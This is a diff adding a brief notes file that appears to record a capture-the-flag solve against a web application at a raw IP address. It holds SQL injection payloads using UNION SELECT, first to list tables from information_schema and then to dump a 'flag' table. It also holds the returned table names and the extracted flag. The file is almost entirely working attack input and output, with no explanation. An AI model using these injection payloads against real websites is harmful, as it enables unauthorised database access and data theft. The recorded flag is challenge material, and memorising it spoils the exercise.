@@ -1,0 +1,9 @@
+http://80.251.47.27/index.php
+
+asdf' union select table_name, 2 from information_schema.tables where '1'='1' or 'a'='
+
+flag	2
+news	2
+
+flag' union select *, 2 from flag where '1'='1' or 'a'='
+Is@1dTh@tWAFisUs3l3ss4us	2
